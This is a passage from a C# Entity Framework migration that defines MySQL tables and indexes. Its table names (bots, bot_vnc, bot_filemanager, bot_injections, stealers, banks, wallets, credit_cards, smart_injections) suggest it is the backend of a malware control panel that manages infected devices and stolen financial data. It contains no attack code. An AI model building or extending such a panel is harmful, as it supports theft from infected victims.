                        column: x => x.user_id,
                        principalTable: "users",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "user_telegram_messages",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    user_id = table.Column<ulong>(type: "bigint unsigned", nullable: false),
                    Message = table.Column<string>(type: "longtext", nullable: true, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    IsSend = table.Column<bool>(type: "tinyint(1)", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_user_telegram_messages", x => x.id);
                    table.ForeignKey(
                        name: "user_telegram_bots_user_id_foreign1",
                        column: x => x.user_id,
                        principalTable: "users",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "user_timestamps",
                columns: table => new
                {
                    user_id = table.Column<ulong>(type: "bigint unsigned", nullable: false),
                    bots = table.Column<DateTime>(type: "timestamp", nullable: true),
                    banks = table.Column<DateTime>(type: "timestamp", nullable: true),
                    stealers = table.Column<DateTime>(type: "timestamp", nullable: true),
                    crypt = table.Column<DateTime>(type: "timestamp", nullable: true),
                    shops = table.Column<DateTime>(type: "timestamp", nullable: true),
                    emails = table.Column<DateTime>(type: "timestamp", nullable: true),
                    wallets = table.Column<DateTime>(type: "timestamp", nullable: true),
                    credit_cards = table.Column<DateTime>(type: "timestamp", nullable: true),
                    permissionless_bots = table.Column<DateTime>(type: "timestamp", nullable: true),
                    events = table.Column<DateTime>(type: "timestamp", nullable: true),
                    smart_injections = table.Column<DateTime>(type: "timestamp", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PRIMARY", x => x.user_id);
                    table.ForeignKey(
                        name: "user_timestamps_user_id_foreign",
                        column: x => x.user_id,
                        principalTable: "users",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateIndex(
                name: "bot_commands_bot_id_foreign",
                table: "bot_commands",
                column: "bot_id");

            migrationBuilder.CreateIndex(
                name: "bot_filemanager_bot_id_foreign",
                table: "bot_filemanager",
                column: "bot_id");

            migrationBuilder.CreateIndex(
                name: "bot_files_bot_id_foreign",
                table: "bot_files",
                column: "bot_id");

            migrationBuilder.CreateIndex(
                name: "bot_injections_application_index",
                table: "bot_injections",
                column: "application");

            migrationBuilder.CreateIndex(
                name: "bot_injections_bot_id_foreign",
                table: "bot_injections",
                column: "bot_id");

            migrationBuilder.CreateIndex(
                name: "bot_logs_application_index",
                table: "bot_logs",
                column: "application");

            migrationBuilder.CreateIndex(
                name: "bot_logs_bot_id_foreign",
                table: "bot_logs",
                column: "bot_id");

            migrationBuilder.CreateIndex(
                name: "bot_logs_telegram_accepted_index",
                table: "bot_logs",
                column: "telegram_accepted");

            migrationBuilder.CreateIndex(
                name: "bot_logs_type_index",
                table: "bot_logs",
                column: "type");

            migrationBuilder.CreateIndex(
                name: "bot_vnc_bot_id_foreign",
                table: "bot_vnc",
                column: "bot_id");

            migrationBuilder.CreateIndex(
                name: "bots_tag_index",
                table: "bots",
                column: "tag");

            migrationBuilder.CreateIndex(
                name: "injections_application_unique",
                table: "injections",
                column: "application",
                unique: true);

            migrationBuilder.CreateIndex(
                name: "model_has_permissions_model_id_model_type_index",
                table: "model_has_permissions",
                columns: new[] { "model_id", "model_type" });

            migrationBuilder.CreateIndex(
                name: "model_has_roles_model_id_model_type_index",
                table: "model_has_roles",
                columns: new[] { "model_id", "model_type" });

            migrationBuilder.CreateIndex(
                name: "permissions_name_guard_name_unique",
                table: "permissions",
                columns: new[] { "name", "guard_name" },
                unique: true);

            migrationBuilder.CreateIndex(
                name: "role_has_permissions_role_id_foreign",
                table: "role_has_permissions",
                column: "role_id");

            migrationBuilder.CreateIndex(
                name: "roles_name_guard_name_unique",
                table: "roles",
                columns: new[] { "name", "guard_name" },
                unique: true);

            migrationBuilder.CreateIndex(
                name: "user_bot_timestamp_application_index",
                table: "user_bot_timestamp",
                column: "application");

            migrationBuilder.CreateIndex(
                name: "user_bot_timestamp_bot_id_index",
                table: "user_bot_timestamp",
                column: "bot_id");

            migrationBuilder.CreateIndex(
                name: "user_bot_timestamp_user_id_foreign",
                table: "user_bot_timestamp",
                column: "user_id");

            migrationBuilder.CreateIndex(
                name: "user_tags_tag_index",
                table: "user_tags",
                column: "tag");

            migrationBuilder.CreateIndex(
                name: "user_tags_user_id_foreign",
                table: "user_tags",
                column: "user_id");

            migrationBuilder.CreateIndex(
                name: "user_telegram_attempts_user_id_foreign",
                table: "user_telegram_attempts",
                column: "user_id");

            migrationBuilder.CreateIndex(
                name: "user_telegram_bots_bot_id_foreign",
                table: "user_telegram_bots",
                column: "bot_id");

            migrationBuilder.CreateIndex(
                name: "user_telegram_bots_user_id_foreign",
                table: "user_telegram_bots",
                column: "user_id");

            migrationBuilder.CreateIndex(
                name: "user_telegram_injections_bot_id_foreign",
                table: "user_telegram_injections",
                column: "bot_id");

            migrationBuilder.CreateIndex(
                name: "user_telegram_injections_user_id_foreign",
                table: "user_telegram_injections",
                column: "user_id");

            migrationBuilder.CreateIndex(
                name: "user_telegram_bots_user_id_foreign1",
                table: "user_telegram_messages",
                column: "user_id");

            migrationBuilder.CreateIndex(
                name: "users_created_user_id_foreign",
                table: "users",
                column: "created_user_id");

            migrationBuilder.CreateIndex(
                name: "users_token_unique",
                table: "users",
                column: "token",
                unique: true);
        }

        protected override void Down(MigrationBuilder migrationBuilder)
        {
            migrationBuilder.DropTable(
                name: "auto_commands");

            migrationBuilder.DropTable(
                name: "bot_commands");

            migrationBuilder.DropTable(
                name: "bot_filemanager");

            migrationBuilder.DropTable(
                name: "bot_files");

            migrationBuilder.DropTable(
                name: "bot_injections");

            migrationBuilder.DropTable(
                name: "bot_logs");

            migrationBuilder.DropTable(
                name: "bot_vnc");

            migrationBuilder.DropTable(
                name: "injection_files");

            migrationBuilder.DropTable(
                name: "injection_sessions");

            migrationBuilder.DropTable(
                name: "migrations");

            migrationBuilder.DropTable(
                name: "model_has_permissions");

            migrationBuilder.DropTable(
                name: "model_has_roles");

            migrationBuilder.DropTable(
                name: "role_has_permissions");

            migrationBuilder.DropTable(
                name: "settings");

            migrationBuilder.DropTable(
                name: "user_bot_timestamp");

            migrationBuilder.DropTable(
                name: "user_tags");

            migrationBuilder.DropTable(
                name: "user_telegram_attempts");

            migrationBuilder.DropTable(
                name: "user_telegram_bots");

            migrationBuilder.DropTable(
                name: "user_telegram_injections");

            migrationBuilder.DropTable(
                name: "user_telegram_messages");

            migrationBuilder.DropTable(
                name: "user_timestamps");

            migrationBuilder.DropTable(
                name: "injections");

            migrationBuilder.DropTable(
                name: "permissions");

            migrationBuilder.DropTable(
                name: "roles");

            migrationBuilder.DropTable(
                name: "bots");

            migrationBuilder.DropTable(
                name: "users");
        }
    }
}
